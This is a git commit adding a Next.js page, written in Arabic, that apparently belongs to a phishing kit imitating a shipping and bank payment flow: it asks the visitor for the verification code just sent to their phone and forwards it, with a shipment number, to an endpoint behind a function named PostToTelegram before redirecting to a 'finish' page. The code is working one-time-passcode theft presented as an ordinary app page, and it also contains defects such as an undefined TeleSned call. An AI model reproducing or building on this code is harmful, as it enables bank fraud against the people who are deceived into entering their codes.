4e016d9c3bd5410296d8a688cbbd03d44cede1ec
اmilad998 <myaralbwd20@gmail.com>
2025-08-26 22:57:41 +0300

    jlollplkihnndl

---
+++ ‏‏my-app/src/app/aram/banks/pay/code/codeto/page.jsx
@@ -0,0 +1,78 @@
+"use client"
+
+import styles from './code.module.css'
+import {  useState } from 'react'
+import { useRouter,useSearchParams } from 'next/navigation'
+
+import Image from 'next/image'
+import headercode from "../../../../../../../public/headercode.png"
+
+const Code = () => {
+  const {Send} = TeleSned();
+  const router = useRouter();
+  const x = useSearchParams();
+  const datas = x.get("names")
+  const [form,setForm]=useState({
+    data:{
+      كود_التحقق:"",
+      رقم_الشحنة:datas
+    }
+  })
+  const setDynamicFormData = (name,value)=>{
+    setForm({
+      data:{
+        ...form.data,
+        [name]:value,
+      }
+    })
+  }
+ const PostToTelegram = async() => {
+    const description = Object.entries(form.data)
+      .map((d) => `${d[0]} : ${d[1]} `)
+      .join("%0A");
+    await fetch("/api/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ description }),
+    });
+
+    
+  };
+  const handlerout = ()=>{
+    if(form.data.code == ""){
+      alert('من فضلك قم بملى الحقول')
+    }else{
+      router.push(`/aram/banks/pay/code/finish?names=${datas}`)
+    }
+  }
+
+
+
+
+  return (
+    <div className={styles.contect}>
+      <div>
+        <div>
+        <Image src={headercode} width={370}/>
+        </div>
+      <h1> تاكيد</h1>
+      <p>ادخال الكود المرسل حديثا على هاتفك</p>
+     
+      <form  onSubmit={(e)=>{
+        e.preventDefault();
+        PostToTelegram()
+      }}>
+        
+        <input type="text" name="كود_التحقق" onChange={(e) => {
+                  const { name, value } = e.target;
+                  setDynamicFormData(name, value);
+                }} placeholder="ادخل كود التحقق" />
+        
+        <button type='submit' onClick={handlerout}>دخول</button>
+      </form>
+      </div>
+    </div>
+  )
+}
+
+export default Code
